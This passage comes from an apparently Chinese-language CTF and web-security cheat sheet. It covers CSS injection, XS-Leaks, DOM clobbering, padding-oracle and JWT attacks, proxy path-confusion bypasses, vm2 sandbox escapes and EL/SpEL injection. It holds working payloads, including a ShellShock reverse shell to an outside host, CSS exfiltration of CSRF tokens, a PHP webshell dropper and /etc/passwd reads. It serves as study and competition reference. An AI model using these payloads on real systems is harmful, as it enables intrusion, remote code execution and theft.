            - CSS 語法容錯率很高

## CSS Injection

- CSS 可控時，可以Leak Information
- Example:
    - leak `<input type='hidden' name='csrf' value='2e3d04bf...'>`
    - `input[name=csrf][value^="2"]{background: url(http://kaibro.tw/2)}`
    - `input[name=csrf][value^="2e"]{background: url(http://kaibro.tw/2e)}`
    - ...
    - [SECCON CTF 2018 - GhostKingdom](https://github.com/w181496/CTF/tree/master/seccon2018-qual/GhostKingdom)


## XS-Leaks

- Cross-Site Browser Side channel attack
- [xsleaks wiki](https://github.com/xsleaks/xsleaks/wiki/Browser-Side-Channels)

### Frame count
- 不同狀態有不同數量的 frame
- 用 `window.frames.length` 來判斷
    - 狀態A => frame count = x
    - 狀態B => frame count = y
    - x != y
- e.g. [Facebook CTF - Secret Note Keeper](https://github.com/w181496/CTF/tree/master/fbctf2019/secret_note_keeper)
    - 找到結果 => frame count >= 1
    - 沒找到 => frame count = 0

### Timing
- 不同狀態有不同回應時間
- Time(有結果) > Time(沒結果)
    - 有結果時，會需要載入比較多東西

### XSS Filter
- iframe正常訪問，會觸發一次onload事件
- 在iframe.src尾，加上`#`做請求，正常不會再觸發onload事件
- 但如果原本頁面被filter block，則會有第二次onload
    - 第二次請求變成`chrome-error://chromewebdata/#`
- 可以判斷頁面狀態
    - 正常 => 1次onload
    - 被Blocked => 2次onload
- 也能用`history.length`判斷
- e.g. 35C3 - filemanager

### HTTP Cache
- 清空目標 Cache
    - 送 POST 請求
- 查詢內容
    - `<link rel=prerender href="victim.com">`
- 檢查是否 Cache 該內容
    - Referrer 設超長，然後訪問該資源
    - 有 cache => 顯示資源
    - 沒 cache => 抓不到資源

## DOM Clobbering

```html
<form id=test1></form>
<form name=test2></form>

<script>
console.log(test1); // <form id=test1></form>
console.log(test2); // <form name=test2></form>
console.log(document.test1); // undefined
console.log(document.test2); // <form name=test2></form>
</script>
```

- `id` 屬性被當成全域變數
- `name` 屬性被當成 `document` 屬性

<br>

- 覆蓋原生函數

```html
<form name="getElementById"></form>
<form id="form"></form>

<script>
console.log(document.getElementById("form"));  // Error 
</script>

<script>
console.log("I'll be executed!");
</script>
```

這裡第一個 script block 因為錯誤被跳過，第二個 script block 依舊會執行 (常拿來繞檢查)

<br>

- toString 問題

    ```html
    <form id=test1><input name=test2></form>
    <script>
      alert(test1.test2); // "[object HTMLInputElement]"
    </script>
    ```
    - `<a>` 的 `href` 可以解決 toString 問題: `<a id=test1 href=http://kaibro.tw>`
        - `alert(test1);` => `http://kaibro.tw`
    - `<form id=test1><a name=test2 href=http://kaibro.tw></form>` 依舊有問題
        - `alert(test1.test2);` => `undefined`
        - 解法見下面 HTMLCollection

<br>

- HTMLCollection

```html
<a id=test1>click!</a>
<a id=test1>click2!</a>
<script>
console.log(window.test1);  //  <HTMLCollection(2) [a#test1, a#test1, test1: a#test1]
</script>
```

`name` 屬性也會直接變成 `HTMLCollection` 的屬性:

```html
<a id="test1"></a>
<a id="test1" name="test2" href="x:alert(1)"></a>
<script>
alert(window.test1.test2);  //  x:alert(1)
</script>
```

- Example
    - [Google CTF 2019 Qual - pastetastic](https://github.com/koczkatamas/gctf19/tree/master/pastetastic)
    - [Volga CTF 2020 Qualifier - Archive](https://blog.blackfan.ru/2020/03/volgactf-2020-qualifier-writeup.html)

## Shadow DOM

- 可以將隱藏、獨立的 DOM 附加到元素上
- 透過 `Element.attachShadow()` 可以將一個 Shadow root 附加到一個元素上
    - 參數可以帶 `{mode:"open"}` 或是 `{mode:"closed"}`
        - open: `Elements of the shadow root are accessible from JavaScript outside the root`
        - closed: `Denies access to the node(s) of a closed shadow root from JavaScript outside it`
- `window.find` + `-webkit-user-modify` + `document.execCommand`
    - 透過 CSS `-webkit-user-modify:read-write` 屬性，可以讓 shadow DOM 做到 `contenteditable` 效果
    - `window.find()` 可以 focus shadow DOM 中的內容
    - 之後就能用 `document.execCommand()` 去插入 HTML，透過 svg 執行 JS 取得節點
        - `document.execCommand('insertHTML',false,'<svg/onload=alert(this.parentNode.innerHTML)>')`
- Example
    - [Dice CTF 2022 - shadow](https://github.com/Super-Guesser/ctf/blob/master/2022/dicectf/shadow.md)
    - [HITCON CTF 2022 - Self Destruct Message](https://blog.splitline.tw/hitcon-ctf-2022/)

# 密碼學

## PRNG

- php 7.1.0 後 `rand()` 和 `srand()` 已經等同 `mt_rand()` 和 `mt_srand()`
    - 測試結果：https://3v4l.org/PIUEo

- php > 4.2.0 會自動對 `srand()` 和 `mt_srand()` 播種
    - 只進行一次 seed，不會每次 `rand()` 都 seed
    
- 可以通過已知的 random 結果，去推算隨機數種子，然後就可以推算整個隨機數序列
- 實際應用上可能會碰到連上的不是同個 process，可以用 `Keep-Alive
`來確保連上同個 php process (只會 seed 一次)
- 7.1 以前 `rand()` 使用 libc random()，其核心為：`
state[i] = state[i-3] + state[i-31]`
    - 所以只要有31個連續隨機數就能預測接下來的隨機數
    - 後來 `rand()` alias 成 `mt_rand()`，採用的是 `Mersenne Twister` 算法
- Example: HITCON 2015 - Giraffe’s Coffee


## ECB mode

### Cut and Paste Attack

- 每個Block加密方式都一樣，所以可以把Block隨意排列
- 舉例： `user=kaibro;role=user`
    - 假設 Block 長度為 8
    - 構造一下 user: (`|` 用來區隔 Block)
        - `user=aaa|admin;ro|le=user`
        - `user=aaa|aa;role=|user`
    - 排列一下：(上面每塊加密後的 Block 都已知)
        - `user=aaa|aa;role=|admin;ro`
- Example: AIS3 2017 pre-exam

### Encryption Oracle Attack

- `ECB(K, A + B + C)` 的運算結果可知
    - B 可控
    - K, A, C 未知
- C 的內容可以透過以下方法爆出來：
    - 找出最小的長度 L
    - 使得將 B 改成 L 個 a，該段 pattern 剛好重複兩次
        - `...bbbb bbaa aaaa aaaa cccc ...`
        - `...???? ???? 5678 5678 ???? ...`
    - 改成 L-1 個 a，可得到 `ECB(K, "aa...a" + C[0])` 這個 Block 的內容
    - C[0] 可爆破求得，後面也依此類推
- 常見發生場景：Cookie

## CBC mode

### Bit Flipping Attack

- 假設 IV 為 A、中間值為 B (Block Decrypt 後結果)、明文為 C
- CBC mode 解密時，`A XOR B = C`
- 若要使輸出明文變 `X`
- 修改 A 為 `A XOR C XOR X`
- 則原本式子變成 `(A XOR C XOR X) XOR B = X`

### Padding Oracle Attack

- `PKCS#7`
    - Padding 方式：不足 x 個 Byte，就補 x 個 x
        - 例如：Block 長度 8
        - `AA AA AA AA AA AA AA 01`
        - `AA AA AA AA AA AA 02 02`
        - `AA AA AA AA AA 03 03 03`
        - ...
        - `08 08 08 08 08 08 08 08`
    - 在常見情況下，如果解密出來發現 Padding 是爛的，會噴 Exception 或 Error
        - 例如：HTTP 500 Internal Server Error
        - 須注意以下這類情況，不會噴錯：
            - `AA AA AA AA AA AA 01 01`
            - `AA AA 02 02 02 02 02 02`
- 原理：
    - CBC mode 下，前一塊密文會當作當前這塊的 IV，做 XOR
    - 如果構造 `A||B` 去解密 (A, B 是密文 Block)
    - 此時，A 會被當作 B 的 IV，B 會被解成 `D(B) XOR A`
    - 可以透過調整 A，使得 Padding 變合法，就可以得到 `D(B)` 的值
        - 例如：要解最後 1 Byte
        - 想辦法讓最後解出來變成 `01` 結尾
        - 運氣不好時，可能剛好碰到 `02 02` 結尾，可以調整一下 A 倒數第 2 Byte
        - `D(B)[-1] XOR A[-1] = 01`
        - `D(B)[-1] = A[-1] XOR 01`
        - 有最後 1 Byte 就可以依此類推，調整倒數第 2 Byte
    - `D(B) XOR C` 就能得到明文 ( C 為前一塊真正的密文)



## Length Extension Attack

- 很多hash算法都可能存在此攻擊，例如`md5`, `sha1`, `sha256`...
- 主要是因為他們都使用 Merkle-Damgard hash construction
- 會依照 64 Byte 分組，不足會 padding
    - 1 byte 的 `0x80` + 一堆 `0x00`+8 bytes 的`長度`
- IV 是寫死的，且每一組輸出結果會當下一組的輸入
- 攻擊條件： (這裏 md5 換成 sha1, sha256... 也通用)
    - 已知 `md5(secret+message)`
    - 已知 `secret長度`
    - 已知 `message內容`
- 符合三個條件就能構造 `md5(secret+message+padding+任意字串)`
- 工具 - hashpump
    - 基本用法：
        1. 輸入 `md5(secret+message)` 的值
        2. 輸入 `message` 的值
        3. 輸入 `secert長度`
        4. 輸入要加在後面的字串
        5. 最後會把 `md5(secret+message+padding+任意字串)` 和 `message+padding+任意字串` 噴給你


# 其它

 - Information leak
     - .git / .svn
     - robots.txt
     - /.well-known
     - .DS_Store
     - .htaccess
     - .pyc
     - package.json
     - server-status
     - crossdomain.xml
     - admin/ manager/ login/ backup/ wp-login/ phpMyAdmin/
     - xxx.php.bak / www.tar.gz / .xxx.php.swp / xxx.php~ / xxx.phps
     - /WEB-INF/web.xml
 - 文件解析漏洞
     - Apache
         - shell.php.ggininder
         - shell.php%0a
            - httpd 2.4.0 to 2.4.29
            - CVE-2017-15715
     - IIS
         - IIS < 7
             - a.asp/user.jpg
             - user.asp;aa.jpg
     - Nginx
         - nginx < 8.03
             - `cgi.fix_pathinfo=1`
             - Fast-CGI開啟狀況下
             - kaibro.jpg: `<?php fputs(fopen('shell.php','w'),'<?php eval($_POST[cmd])?>');?>`
             - 訪問`kaibro.jpg/.php`生成shell.php

- AWS常見漏洞
    - S3 bucket 權限配置錯誤
        - nslookup 判斷
            - `nslookup 87.87.87.87`
            - `s3-website-us-west-2.amazonaws.com.`
        - 確認 bucket
            - 訪問`bucketname.s3.amazonaws.com`
            - 成功會返回 bucket XML 資訊
        - awscli 工具
            - 列目錄 `aws s3 ls s3://bucketname/ --region regionname`
            - 下載 `aws sync s3://bucketname/ localdir --region regionname`
    - metadata
        - http://169.254.169.254/latest/meta-data/
        - Tool 
            - https://andresriancho.github.io/nimbostratus/

- JWT (Json Web Token)
    - 重置算法 None
        - `import jwt; print(jwt.encode({"userName":"admin","userRoot":1001}, key="", algorithm="none"))[:-1]`
    - 降級算法
        - 把"非對稱式加密"降級為"對稱式加密"
        - e.g. RS256 改成 HS256

        ```python
        import jwt
        public = open('public.pem', 'r').read()   # public key
        prin(jwt.encode({"user":"admin","id":1}, key=public, algorithm='HS256'))
        ```

    - 暴力破解密鑰
        - Tool: [JWT Cracker](https://github.com/brendan-rius/c-jwt-cracker)
            - usage: `./jwtcrack eyJhbGci....`
        - Example:
            - [WCTF 2020 - thymeleaf](https://github.com/w181496/CTF/tree/master/wctf2020/thymeleaf)
    - kid 參數 (key ID)
        - 是一個可選參數
        - 用於指定加密算法的密鑰
        - 任意文件讀取
            - `"kid" : "/etc/passwd"`
        - SQL注入
            - kid 有可能從資料庫提取數據
            - `"kid" : "key11111111' || union select 'secretkey' -- "`
        - Command Injection
            - Ruby open: `"/path/to/key_file|whoami"`
        - Example: [HITB CTF 2017 - Pasty](https://chybeta.github.io/2017/08/29/HITB-CTF-2017-Pasty-writeup/)
    - jku
        - 用來指定連接到加密 Token 密鑰的 URL
        - 如果未限制的話，攻擊者可以指定自己的密鑰文件，用它來驗證 token
            - Example: [VolgaCTF 2021 Qual - JWT](https://github.com/w181496/CTF/tree/master/volgactf2021_quals/JWT)
    - 敏感訊息洩漏
        - JWT 是保證完整性而不是保證機密性
        - base64 decode 後即可得到 payload 內容
        - Example
            - [CSAW CTF 2018 Qual - SSO](https://github.com/w181496/CTF/blob/47fe34112401d123b2b53ee12058e7ec72888e0e/csaw_2018_qual/sso/README.md)
    - jwt.io
- 常見 Port 服務
    - http://packetlife.net/media/library/23/common_ports.pdf
- `php -i | grep "Loaded Configuration File"`    
    - 列出 php.ini 路徑
- HTTP Method
    - OPTIONS method
        - 查看可用 HTTP method
        - `curl -i -X OPTIONS 'http://evil.com/'`
    - HEAD method
        - 特殊場景下容易出現邏輯問題 `if(request.method == get) {...} else {...}` 
        - Werkzeug 只要有設定接受 `GET` 請求，也會自動接受 `HEAD` ([ref](https://werkzeug.palletsprojects.com/en/2.0.x/routing/#werkzeug.routing.Rule))
        - Example: 
            - [FwordCTF 2021 - Shisui](https://lebr0nli.github.io/blog/security/fwordCTF2021/#shisui-web)
            - [Bypassing GitHub's OAuth flow](https://blog.teddykatz.com/2019/11/05/github-oauth-bypass.html)

- ShellShock
    - `() { :; }; echo vulnerable`
    - `() { :a; }; /bin/cat /etc/passwd`
    - `() { :; }; /bin/bash -c '/bin/bash -i >& /dev/tcp/kaibro.tw/5566 0>&1'`

- X-forwarded-for 偽造來源IP
    - `Client-IP`
    - `X-Client-IP`
    - `X-Real-IP`
    - `X-Remote-IP`
    - `X-Remote-Addr`
    - `X-Host`
    - ...
    - 各種繞 Limit (e.g. Rate limit bypass)
    - Heroku feature
        - https://jetmind.github.io/2016/03/31/heroku-forwarded.html
        - 同時送多個 `X-Forwarded-For` header，可以讓真實 IP 被包在 IP list 中間 (Spoofing)
        - Example: [angstromCTF 2021 - Spoofy](https://github.com/r00tstici/writeups/tree/master/angstromCTF_2021/spoofy)

- DNS Zone Transfer
    - `dig @1.2.3.4 abc.com axfr`
        - DNS Server: `1.2.3.4`
        - Test Domain: `abc.com`

- IIS 短檔名列舉
    - Windows 8.3 格式: `administrator` 可以簡寫成 `admini~1`
    - 原理：短檔名存在或不存在，伺服器回應內容不同
    - Example
        - MidnightSun CTF 2024 - ASPowerTools
            - `webClient.DownloadString("http://../inetpub/wwwroot/aspowertools/FLAGFL~1.MAS")`
    - Tool:
        - https://github.com/irsdl/IIS-ShortName-Scanner
            - `java -jar iis_shortname_scanner.jar 2 20 http://example.com/folder/`
        - https://github.com/sw33tLie/sns
- ASP.net Cookieless DuoDrop (CVE-2023-36899 & CVE-2023-36560)
    - CVE-2023-36899
        - `/WebForm/(S(X))/prot/(S(X))ected/target1.aspx`
        - `/WebForm/(S(X))/b/(S(X))in/target2.aspx`
    - CVE-2023-36560
        - `/WebForm/pro/(S(X))tected/target1.aspx/(S(X))/`
        - `/WebForm/b/(S(X))in/target2.aspx/(S(X))/`
    - Example
        - MidnightSun CTF 2024 - ASPowerTools
            - `/(S(x))/b/(S(x))in/ASPowerTools.dll`
            - `/(S(X))/prot/(S(X))ected/login.aspx`
    - ref:
        - [Cookieless DuoDrop: IIS Auth Bypass & App Pool Privesc in ASP.NET Framework (CVE-2023-36899 & CVE-2023-36560)](https://soroush.me/blog/2023/08/cookieless-duodrop-iis-auth-bypass-app-pool-privesc-in-asp-net-framework-cve-2023-36899/)
        - [Source Code Disclosure in ASP.NET apps](https://swarm.ptsecurity.com/source-code-disclosure-in-asp-net-apps/)

- NodeJS unicode failure
    - 內部使用 UCS-2 編碼
    - `ＮＮ` => `..`
        - `Ｎ` 即 `\xff\x2e`
        - 轉型時捨棄第一個 Byte

- 特殊的 CRLF Injection 繞過
    - `%E5%98%8A`
    - 原始的 Unicode 碼為 `U+560A`
    - raw bytes: `0x56`, `0x0A`

- MySQL utf8 v.s. utf8mb4
    - MySQL utf8 編碼只支援 3 bytes
    - 若將 4 bytes 的 utf8mb4 插入 utf8 中，在 non strict 模式下會被截斷
    - CVE-2015-3438 WordPress Cross-Site Scripting Vulnerability

- Proxy 相關
    - Path parameters
        - Tomcat & Jetty: `/path;param/abcd` => `/path/abcd`
        - WebLogic & WildFly: `/path;param/abcd` => `/path`
    - Nginx + Tomcat
        - `..;`
        - 情境: Nginx -> Tomcat, Nginx deny `/manager`
            - `/docs/..;/manager/html`
                - Nginx: `/docs/..;/manager/html`
                - Tomcat: `/manager/html`
        - 情境: Nginx -> Tomcat, Nginx deny `/console/` (`location ~* /console/`)
            - `/..;/console;/flag`
                - Nginx: `/..;/console;/flag`
                - Tomcat: `/console/flag`
    - Nginx + Apache
        - 情境: Nginx -> Apache, Nginx deny `/admin`
            - `proxy_pass http://apache` (No trailing slash，以原始資料送到後端)
            - `/admin//../flag`
                - Nginx: `/flag`
                - Apache: `/admin/flag`
    - Nginx + WebLogic
        - 情境: Nginx -> WebLogic, Nginx deny `/console`
            - `proxy_pass http://weblogic;`
                - Nginx: `/`
                - WebLogic: `/console`
            - `/#/../console`
    - Nginx + Gunicorn
        - 繞黑名單規則
            - Nginx deny `/admin`
            - `/admin/key\x09HTTP/1.1/../../../`
                - Nginx: `/` 
                - Gunicorn: `/admin/key`
            - Nginx 新版本已修復
            - Example: 
                - [CSAW 2021 - gatekeeping](https://lebr0nli.github.io/blog/security/nginx-gunicorn-CSAW2021/#exploit)
                - [corCTF 2023 - pdf pal](https://blog.huli.tw/2023/09/02/corctf-sekaictf-2023-writeup/#pdf-pal-2-solves)
    - Nginx + Swift
        - Example: [Line CTF 2024 - zipviewer-version-clown](https://adragos.ro/line-ctf-2024/#zipviewer-version-clown)
            - Nginx 大小寫敏感，Swift 不敏感
            - 繞 Rate limit
    - Haproxy + Caddy
        - Haproxy: `keep-alive` + `CONNECT` + 2xx status，會讓其處於 tunnel mode，不採用任何 rules
        - Cadday: 用 normalized path 來 matching，但送出的卻不是 normalized path
        - Example: [SecurityFest CTF 2022 - tunnelvision](https://blog.maple3142.net/2022/06/03/securityfest-ctf-2022-writeups/#tunnelvision)
    - ref: https://github.com/GrrrDog/weird_proxies/tree/master
- Gunicorn `SCRIPT_NAME`
    - `SCRIPT_NAME` 可以改變 base path
        - 當 `SCRIPT_NAME=test`，`/a/b/test/flag` => `/flag`
    - gunicorn 的 `SCRIPT_NAME` 可以透過 HTTP Header 設定
        - `SCRIPT_NAME: a`
        - 前面如果有 Proxy，例如 Nginx，則要開啟 `underscores_in_headers` 才能允許 header 中的 `_`
    - Example: [CSAW 2021 - gatekeeping](https://lebr0nli.github.io/blog/security/nginx-gunicorn-CSAW2021/#exploit)
- Nginx internal繞過
    - `X-Accel-Redirect`
    - [Document](https://www.nginx.com/resources/wiki/start/topics/examples/x-accel/)
    - Example: 
        - Olympic CTF 2014 - CURLing
        - [MidnightSun CTF 2019 - bigspin](https://balsn.tw/ctf_writeup/20190406-midnightsunctf/#bigspin)
        - [PBCTF 2023 - Makima](https://nguyendt.hashnode.dev/pbctf-2023-writeup#heading-makima)


- Nginx 目錄穿越漏洞
    - 常見於 Nginx 做 Reverse Proxy 的狀況
    ```
    location /files {
        alias /home/
    }
    ```
    - 因為 `/files` 沒有加上結尾 `/`，而 `/home/` 有
    - 所以 `/files../` 可以訪問上層目錄

- Nginx add_header 
    - 預設當 repsponse 是 200, 201, 204, 206, 301, 302, 303, 304, 307, or 308 時，`add_header` 才會設定 header
    - e.g. [Codegate 2020 - CSP](https://balsn.tw/ctf_writeup/20200208-codegatectf2020quals/#csp)

- Nginx $url CRLF Injection
    - `$uri` 是解碼後的請求路徑，可能包含換行，有機會導致 CRLF Injection
        - 應改用 `$request_uri`
    - Example: [VolgaCTF 2021 - Static Site](https://github.com/w181496/CTF/tree/master/volgactf2021_quals/Static_Site)
        - `proxy_pass https://volga-static-site.s3.amazonaws.com$uri;`
        - CRLF Injection 蓋掉 S3 Bucket 的 Host header，控 Response 內容做 XSS

- Javascript 大小寫特性
    - `"ı".toUpperCase() == 'I'`
    - `"ſ".toUpperCase() == 'S'`
    - `"K".toLowerCase() == 'k'`
    - [Reference](https://www.leavesongs.com/HTML/javascript-up-low-ercase-tip.html)
- Javascript replace 特性
    - replace string 中可以使用 `$`
    ```
    > "123456".replace("34", "xx")
    '12xx56'
    > "123456".replace("34", "$`")
    '121256'
    > "123456".replace("34", "$&")
    '123456'
    > "123456".replace("34", "$'")
    '125656'
    > "123456".replace("34", "$$")
    '12$56'
    ```
    - Example
        - [Dragon CTF 2021 - webpwn](https://github.com/w181496/CTF/tree/master/dragonctf-2021)
- Javascript Proxy 
    - [doc](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Proxy)
    - 嘗試取得被 Proxy 保護住的 flag: `var p = new Proxy({flag: window.flag || 'flag'}, { get: () => 'nope' }`
    - 解法: `Object.getOwnPropertyDescriptor(p, 'flag')`
    - Example
        - [corCTF 2022 - sbxcalc](https://brycec.me/posts/corctf_2022_challenges#sbxcalc)
- Node.js 目錄穿越漏洞
    - CVE-2017-14849
    - 影響: 8.5.0 版
    - `/static/../../../foo/../../../../etc/passwd`

- Node.js vm escape
    - `const process = this.constructor.constructor('return this.process')();process.mainModule.require('child_process').execSync('whoami').toString()`
    - CONFidence CTF 2020 - TempleJS
        - Only allow ```/^[a-zA-Z0-9 ${}`]+$/g```
        - ``` Function`a${`return constructor`}{constructor}` `${constructor}` `return flag` `` ```
- Node.js vm2 escape
    - CVE-2019-10761
        - vm2 <= 3.6.10
    - CVE-2021-23449
        - vm2 <= 3.9.4
        ```javascript
        let res = import('./foo.js')
        res.toString.constructor("return this")().process.mainModule.require("child_process").execSync("whoami").toString();
        ```
    - CVE-2023-29199
        - vm2 <= 3.9.15
        ```javascript
        aVM2_INTERNAL_TMPNAME = {};
        function stack() {
            new Error().stack;
            stack();
        }
        try {
            stack();
        } catch (a$tmpname) {
            a$tmpname.constructor.constructor('return process')().mainModule
                .require('child_process')
                .execSync('echo "flag is here" > flag');
        }
        ```
    - CVE-2023-30547
        - vm2 <= 3.9.16
        ```javascritp
        err = {};
        const handler = {
            getPrototypeOf(target) {
                (function stack() {
                    new Error().stack;
                    stack();
                })();
            }
        };
        const proxiedErr = new Proxy(err, handler);
        try {
            throw proxiedErr;
        } catch ({constructor: c}) {
            c.constructor('return process')().mainModule.require('child_process').execSync('touch pwned');
        }
        ```
    - CVE-2023-32314
        - vm2 <= 3.9.17
        ```javascript
        const err = new Error();
          err.name = {
            toString: new Proxy(() => "", {
              apply(target, thiz, args) {
                const process = args.constructor.constructor("return process")();
                throw process.mainModule.require("child_process").execSync("whoami").toString();
              },
            }),
          };
          try {
            err.stack;
          } catch (stdout) {
            stdout;
          }
        ```
    - CVE-2023-37466
        - vm2 <= 3.9.19
        ```javascript
        async function fn() {
            (function stack() {
                new Error().stack;
                stack();
            })();
        }
        p = fn();
        p.constructor = {
            [Symbol.species]: class FakePromise {
                constructor(executor) {
                    executor(
                        (x) => x,
                        (err) => { return err.constructor.constructor('return process')().mainModule.require('child_process').execSync('touch 123'); }
                    )
                }
            }
        };
        p.then();
        ```
    - vm2 is officially deprecated
        - https://github.com/patriksimek/vm2/issues/533
- Apache Tomcat Session 操縱漏洞
    - 預設 session 範例頁面 `/examples/servlets /servlet/SessionExample`
    - 可以直接對 Session 寫入

- polyglot image + .htaccess
    - XBM 格式有定義在 `exif_imagetype()` 中
    - 符合 `.htaccess` 格式
    - Insomnihack CTF
    ```
    #define gg_width 1337
    #define gg_height 1337
    AddType application/x-httpd-php .asp
    ```

- AutoBinding / Mass Assignment
    - [Mass_Assignment_Cheat_Sheet](https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/Mass_Assignment_Cheat_Sheet.md)
    - Spring MVC
        - `@ModelAttribute`
        - 會將 Client 端傳來的參數 (GET/POST) 綁定到指定 Object 中，並自動將此 Object 加到 ModelMap 中
        - Example
        ```java
        @RequestMapping(value = "/home", method = RequestMethod.GET)
            public String home(@ModelAttribute User user, Model model) {
                if (showSecret){
                    model.addAttribute("firstSecret", firstSecret);
                }
                return "home";
            }
        ```
        - Example 2:
            - [justiceleague](https://github.com/GrrrDog/ZeroNights-HackQuest-2016)
        - Example 3: [VolgaCTF 2019 - shop](https://github.com/w181496/CTF/tree/master/volgactf2019_quals/shop)

- EL Injection / SpEL Injection
    - EL = Expression Language, SpEL = Spring Expression Language
    - Some payload
        - `${"a".toString()}`
        - `${"".getClass()}`
        - `${applicationScope}`
        - `${sessionScope.toString()}`
        - `${pageContext.request.getSession().setAttribute("admin", true)}` 
        - `${T(java.lang.Runtime).getRuntime().exec("<my command here>")}`
        - `${Class.forName('java.lang.Runtime').getRuntime().invoke(null).exec(<RCE>).getInputStream().read()}`
        - `${"".getClass().forName("java.lang.Runtime").getMethods()[6].invoke("".getClass().forName("java.lang.Runtime")).exec("calc.exe")}`
        - `${request.getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("js").eval("java.lang.Runtime.getRuntime().exec(\\\"ping x.x.x.x\\\")"))}`
    - Example
        - [Line CTF 2024 - Heritage](https://gist.github.com/tyage/e0afc9ff5051c2cc487a8cd9b6a1d7ea#heritage)
        - [Seikai CTF 2023 - Frog WAF](https://blog.huli.tw/2023/09/02/corctf-sekaictf-2023-writeup/#frog-waf-29-solves)
        - 繞 openrasp: https://landgrey.me/blog/15/
- GraphQL
    - 資訊洩漏
        - 基本查詢
            - 查詢存在的類型: 
                - `{ __schema { types { name } } }`
                - `{__schema{types{name,fields{name}}}}`
            - 查詢一個類型所有字段: 
                - `{ __type (name: "Query") { name fields { name type { name kind ofType { name kind } } } } }`
                - `{__schema{types{name,fields{name,args{name,description,type{name,kind,ofType{name, kind}}}}}}}`
                    - 提取所有類型、他的字段、參數以及參數類型
                - 可以觀察一些敏感字段，如: password, email, token, session, secretkey, ... 等
            - 透過 Introspection 來撈 schema:
                - `fragment+FullType+on+__Type+{++kind++name++description++fields(includeDeprecated%3a+true)+{++++name++++description++++args+{++++++...InputValue++++}++++type+{++++++...TypeRef++++}++++isDeprecated++++deprecationReason++}++inputFields+{++++...InputValue++}++interfaces+{++++...TypeRef++}++enumValues(includeDeprecated%3a+true)+{++++name++++description++++isDeprecated++++deprecationReason++}++possibleTypes+{++++...TypeRef++}}fragment+InputValue+on+__InputValue+{++name++description++type+{++++...TypeRef++}++defaultValue}fragment+TypeRef+on+__Type+{++kind++name++ofType+{++++kind++++name++++ofType+{++++++kind++++++name++++++ofType+{++++++++kind++++++++name++++++++ofType+{++++++++++kind++++++++++name++++++++++ofType+{++++++++++++kind++++++++++++name++++++++++++ofType+{++++++++++++++kind++++++++++++++name++++++++++++++ofType+{++++++++++++++++kind++++++++++++++++name++++++++++++++}++++++++++++}++++++++++}++++++++}++++++}++++}++}}query+IntrospectionQuery+{++__schema+{++++queryType+{++++++name++++}++++mutationType+{++++++name++++}++++types+{++++++...FullType++++}++++directives+{++++++name++++++description++++++locations++++++args+{++++++++...InputValue++++++}++++}++}}`
        - Suggestion
            - 當輸入一個未知的keyword，Graphql backend 會建議正確的keyword
                - `"message": "Cannot query field \"one\" on type \"Query\". Did you mean \"node\"?",`
            - 透過字典檔去brute-force
                - https://github.com/Escape-Technologies/graphql-wordlist
        - 錯誤訊息
            - 可以透過錯誤訊息取得有用資訊
            - `{__schema}`
            - `{}`
            - `{somerandomshit}`
        - Graphene-Django DEBUG
            - 透過添加 `__debug` 來取得詳細資訊，例如 sql 執行語句
    - Batch query
        - 可以透過 Array-based query 一次送好幾個請求
        - Apollo GraphQL 預設不啟用 Array Batching
        - 常見情境：Password brute-force, Rate limit bypass, DoS
        - `[{ query: 'query { book(id: 1) { __typename } }' },{ query: 'query { book(id: 1) { __typename } }' }]`
        - JSON list based batching 不能用時，可以嘗試 Query name based batching
            - `{"query": "query { kaibro: Query { meow } kaibro1: Query { meow } }"}`
        - Example:
            - [Line CTF 2024 - graphql-101](https://adragos.ro/line-ctf-2024/#graphql-101)
            - [corCTF 2023 - force](https://blog.huli.tw/2023/09/02/corctf-sekaictf-2023-writeup/#force-118-solves)
    - CSRF
        - GET-based
            - `/graphql?query=query+%7B+a+%7D`
        - POST-based
            - content-type 改 `x-www-form-urlencoded` 仍可執行
            - Example: Express-GraphQL, [Portswigger's lab](https://portswigger.net/web-security/graphql/lab-graphql-csrf-via-graphql-api)
    - Query Depth Attack
        - 未阻擋的話，容易造成DoS
        - Example: `query { books { title author { title books { title author { ... } } } } }`
    - Alias overloading
        - Example: `query { book(id: 1) { __typename alias: __typename alias2: __typename alias3: __typename alias4: __typename } }`
    - Tool
        - [graphw00f](https://github.com/dolevf/graphw00f) (fingerprinting)
        - [graphquail](https://github.com/forcesunseen/graphquail)
        - [GraphQLmap](https://github.com/swisskyrepo/GraphQLmap)
        - ...
    - Example:
        - [Line CTF 2023 - Momomomomemomemo](https://blog.huli.tw/2023/03/27/linectf-2023-writeup/#momomomomemomemo-3-solves)
        - [VolgaCTF 2020 - library](https://github.com/w181496/CTF/tree/eedc3315e8c5719771f6ecc5efd11f9d61df314c/volgactf2020_quals/library)
        - [HITCON 2018 - BabyQuery](https://4f-kira.github.io/2018/02/05/HITCTF2018-writeup/#BabyQuery)
- HTTP2 Push
    - Server 自己 push 東西回來 (e.g. CSS/JS file)
    - e.g. [ALLES CTF 2020 - Push](https://github.com/0x13A0F/CTF_Writeups/tree/master/alles_ctf#push)
        - Chrome Net Export tool

- Symlink
    - `ln -s ../../../../../../etc/passwd kaibro.link`
    - `zip --symlink bad.zip kaibro.link`

- curl trick
    - `curl 'fi[k-m]e:///etc/passwd`
    - `curl '{asd,bb}'`
    - Example: [N1CTF 2021 - Funny_web](https://vuln.live/blog/16)

- tcpdump
    - `-i` 指定網卡，不指定則監控所有網卡
    - `-s` 默認只抓96bytes，可以-s指定更大數值
    - `-w` 指定輸出檔
    - `host` 指定主機(ip or domain)
    - `dst`, `src` 來源或目的端
    - `port`指定端口
    - `tcp`, `udp`, `icmp` 指定協議
    - example
        - 來源192.168.1.34且目的端口為80
            - `tcpdump -i eth0 src 192.168.1.34 and dst port 80`
        - 來源192.168.1.34且目的端口是22或3389
            - `tcpdump -i eth0 'src 192.168.1.34 and (dst port 22 or 3389)'`
        - 保存檔案，可以後續用wireshark分析
            - `tcpdump -i eth0 src kaibro.tw -w file.cap`



# Tool & Online Website

## Information gathering

- http://pentest-tools.com/

- https://www.shodan.io/

- https://www.zoomeye.org/

- https://censys.io

- https://crt.sh/

- http://webscan.cc/

- https://x.threatbook.cn/

- https://dnsdumpster.com/

- https://www.domainiq.com/reverse_whois

- https://www.yougetsignal.com/tools/web-sites-on-web-server/

- https://www.robtex.com/dns-lookup/

- https://phpinfo.me/bing.php

- https://www.owasp.org/index.php/Category:OWASP_DirBuster_Project

- https://github.com/laramies/theHarvester

- https://github.com/drwetter/testssl.sh

- https://github.com/urbanadventurer/WhatWeb

